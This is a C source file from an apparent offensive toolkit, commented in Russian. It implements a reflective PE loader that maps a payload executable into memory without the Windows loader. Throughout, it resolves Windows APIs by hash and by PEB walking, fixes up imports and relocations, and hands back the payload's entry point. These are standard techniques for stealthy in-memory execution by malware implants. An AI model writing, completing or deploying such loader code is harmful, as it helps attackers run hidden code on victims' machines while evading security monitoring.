// src/loader/reflective.c
// Reflective PE Loader — маппинг PE в память без Windows loader.
#include "reflective.h"
#include "pe_parser.h"
#include "api_resolver.h"
#include "../common/memory.h"
#include "../common/hashes.h"

// ------------------------------------------------------------
// Разрешение одной функции в DLL по имени (точное совпадение).
// Имя функции — ASCII, ищем по export table.
// ------------------------------------------------------------
static void* resolve_import_func(void* dll_base, const char* func_name) {
    if (!dll_base || !func_name) return NULL_;

    IMAGE_DOS_HEADER_* dos = (IMAGE_DOS_HEADER_*)dll_base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL_;

    IMAGE_NT_HEADERS64_* nt = (IMAGE_NT_HEADERS64_*)((u8*)dll_base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL_;

    IMAGE_DATA_DIRECTORY_* exp_dir =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!exp_dir->VirtualAddress) return NULL_;

    IMAGE_EXPORT_DIRECTORY_* exp =
        (IMAGE_EXPORT_DIRECTORY_*)((u8*)dll_base + exp_dir->VirtualAddress);

    u32* names    = (u32*)((u8*)dll_base + exp->AddressOfNames);
    u16* ordinals = (u16*)((u8*)dll_base + exp->AddressOfNameOrdinals);
    u32* funcs    = (u32*)((u8*)dll_base + exp->AddressOfFunctions);

    for (u32 i = 0; i < exp->NumberOfNames; i++) {
        const char* fname = (const char*)((u8*)dll_base + names[i]);

        // Точное сравнение имён
        const char* a = fname;
        const char* b = func_name;
        while (*a && *b && *a == *b) { a++; b++; }
        if (*a == 0 && *b == 0) {
            return (void*)((u8*)dll_base + funcs[ordinals[i]]);
        }
    }
    return NULL_;
}

// ------------------------------------------------------------
// Загрузка DLL по имени: сначала PEB walking, потом LoadLibraryA.
// ------------------------------------------------------------
static void* load_dll_by_name(const char* dll_name) {
    // 1. Уже загружена?
    void* base = get_module_base_by_name(dll_name);
    if (base) return base;

    // 2. Резолвим LoadLibraryA через наш api_resolver
    typedef void* (__stdcall *pLoadLibraryA)(const char*);
    pLoadLibraryA pLL = (pLoadLibraryA)resolve_kernel32(H_LoadLibraryA);
    if (!pLL) return NULL_;

    return pLL(dll_name);
}

// ------------------------------------------------------------
// Разрешение всех импортов payload'а.
// ------------------------------------------------------------
static BOOL_ reflective_resolve_imports(u8* image_base, pe_info_t* pe) {
    IMAGE_DATA_DIRECTORY_* imp_dir =
        pe_get_directory(pe, IMAGE_DIRECTORY_ENTRY_IMPORT);
    if (!imp_dir || !imp_dir->VirtualAddress) {
        return TRUE_;  // импортов нет — не ошибка
    }

    IMAGE_IMPORT_DESCRIPTOR_* imp = (IMAGE_IMPORT_DESCRIPTOR_*)
        (image_base + imp_dir->VirtualAddress);

    // Идём по массиву дескрипторов, пока не встретим полностью нулевой
    while (imp->Name != 0) {
        const char* dll_name = (const char*)(image_base + imp->Name);
        void* dll_base = load_dll_by_name(dll_name);

        if (!dll_base) {
            imp++;
            continue;
        }

        IMAGE_THUNK_DATA64_* iat = (IMAGE_THUNK_DATA64_*)
            (image_base + imp->FirstThunk);
        IMAGE_THUNK_DATA64_* int_ = (IMAGE_THUNK_DATA64_*)
            (image_base + (imp->OriginalFirstThunk ? imp->OriginalFirstThunk
                                                   : imp->FirstThunk));

        while (int_->AddressOfData != 0) {
            if (int_->AddressOfData & 0x8000000000000000ULL) {
                // Импорт по ординалу. Пока не поддерживаем.
                iat->AddressOfData = 0;
            } else {
                // Импорт по имени. IMAGE_IMPORT_BY_NAME:
                //   WORD Hint;
                //   CHAR Name[];
                u16 hint = *(u16*)(image_base + (u32)int_->AddressOfData);
                (void)hint;
                const char* fname = (const char*)
                    (image_base + (u32)int_->AddressOfData + 2);

                void* fn = resolve_import_func(dll_base, fname);
                iat->AddressOfData = (u64)fn;
            }
            iat++;
            int_++;
        }

        imp++;
    }
    return TRUE_;
}

// ------------------------------------------------------------
// Применение релокаций.
// ------------------------------------------------------------
static BOOL_ reflective_apply_relocations(u8* image_base, pe_info_t* pe) {
    u64 actual = (u64)image_base;
    if (actual == pe->preferred_base) return TRUE_;   // ничего не надо

    IMAGE_DATA_DIRECTORY_* reloc_dir =
        pe_get_directory(pe, IMAGE_DIRECTORY_ENTRY_BASERELOC);
    if (!reloc_dir || !reloc_dir->VirtualAddress) return TRUE_;

    u64 delta = actual - pe->preferred_base;
    u8* p   = image_base + reloc_dir->VirtualAddress;
    u8* end = p + reloc_dir->Size;

    while (p < end) {
        IMAGE_BASE_RELOCATION_* block = (IMAGE_BASE_RELOCATION_*)p;
        if (block->SizeOfBlock == 0) break;

        u32 count = (block->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION_)) / 2;
        u16* entries = (u16*)(p + sizeof(IMAGE_BASE_RELOCATION_));
        u8* target_base = image_base + block->VirtualAddress;

        for (u32 i = 0; i < count; i++) {
            u16 entry = entries[i];
            u16 type = entry >> 12;
            u16 off  = entry & 0x0FFF;
            u8* patch = target_base + off;

            if (type == IMAGE_REL_BASED_DIR64) {
                *(u64*)patch += delta;
            } else if (type == IMAGE_REL_BASED_HIGHLOW) {
                *(u32*)patch += (u32)delta;
            }
            // ABSOLUTE — просто padding, пропускаем
        }

        p += block->SizeOfBlock;
    }
    return TRUE_;
}

// ------------------------------------------------------------
// Основная функция reflective loader'а.
// Использует RW → RX (не RWX) + права по секциям.
// ------------------------------------------------------------
void* reflective_load(u8* raw_pe, u32 raw_size, u64 desired_base, void** out_base) {
    (void)raw_size;
    if (!raw_pe) return NULL_;

    pe_info_t pe;
    if (!pe_parse(raw_pe, &pe)) return NULL_;

    // 1. Выделяем память как RW
    typedef void* (__stdcall *pVirtualAlloc)(void*, u64, u32, u32);
    pVirtualAlloc pVA = (pVirtualAlloc)resolve_kernel32(H_VirtualAlloc);
    if (!pVA) return NULL_;

    void* image_base = NULL_;
    if (desired_base == 0) desired_base = pe.preferred_base;

    image_base = pVA((void*)desired_base, pe.size_of_image,
                     MEM_COMMIT_ | MEM_RESERVE_, PAGE_READWRITE_);
    if (!image_base) {
        image_base = pVA(NULL_, pe.size_of_image,
                         MEM_COMMIT_ | MEM_RESERVE_, PAGE_READWRITE_);
    }
    if (!image_base) return NULL_;

    // 2. Копируем headers
    bs_memcpy(image_base, raw_pe, pe.size_of_headers);

    // 3. Копируем секции
    u8* img = (u8*)image_base;
    for (u16 i = 0; i < pe.num_sections; i++) {
        IMAGE_SECTION_HEADER_* s = &pe.sections[i];
        if (s->SizeOfRawData == 0) continue;

        u32 dst_off = s->VirtualAddress;
        u32 src_off = s->PointerToRawData;
        u32 copy_size = s->SizeOfRawData;
        if (s->Misc.VirtualSize && s->Misc.VirtualSize < copy_size) {
            copy_size = s->Misc.VirtualSize;
        }
        if (src_off + copy_size > raw_size) {
            copy_size = raw_size > src_off ? raw_size - src_off : 0;
        }
        bs_memcpy(img + dst_off, raw_pe + src_off, copy_size);
    }

    // 4. pe2 — для смапленного образа
    pe_info_t pe2;
    if (!pe_parse(image_base, &pe2)) return NULL_;

    // 5. Импорты
    if (!reflective_resolve_imports(img, &pe2)) return NULL_;

    // 6. Релокации
    if (!reflective_apply_relocations(img, &pe2)) return NULL_;

    // 7. Права по секциям (RW → per-section RX/RW/R)
    typedef int (__stdcall *pVirtualProtect)(void*, u64, u32, u32*);
    pVirtualProtect pVP = (pVirtualProtect)resolve_kernel32(H_VirtualProtect);
    if (pVP) {
        // Headers → READONLY
        u32 old = 0;
        pVP(img, pe2.size_of_headers, PAGE_READONLY_, &old);

        // Секции по их флагам
        for (u16 i = 0; i < pe2.num_sections; i++) {
            IMAGE_SECTION_HEADER_* s = &pe2.sections[i];
            u32 sz = s->Misc.VirtualSize ? s->Misc.VirtualSize : s->SizeOfRawData;
            if (sz == 0) continue;

            u32 chars = s->Characteristics;
            u32 prot = PAGE_READONLY_;

            int exec  = (chars & 0x20000000) != 0;  // EXECUTE
            int write = (chars & 0x80000000) != 0;  // WRITE
            int read  = (chars & 0x40000000) != 0;  // READ

            if      (exec && write) prot = PAGE_EXECUTE_READWRITE_;
            else if (exec && read)  prot = PAGE_EXECUTE_READ_;
            else if (exec)          prot = PAGE_EXECUTE_;
            else if (write)         prot = PAGE_READWRITE_;
            else if (read)          prot = PAGE_READONLY_;

            u32 old2 = 0;
            pVP(img + s->VirtualAddress, sz, prot, &old2);
        }
    }

    // 8. Возвращаем entry point
    if (out_base) *out_base = image_base;
    return img + pe.entry_point_rva;
}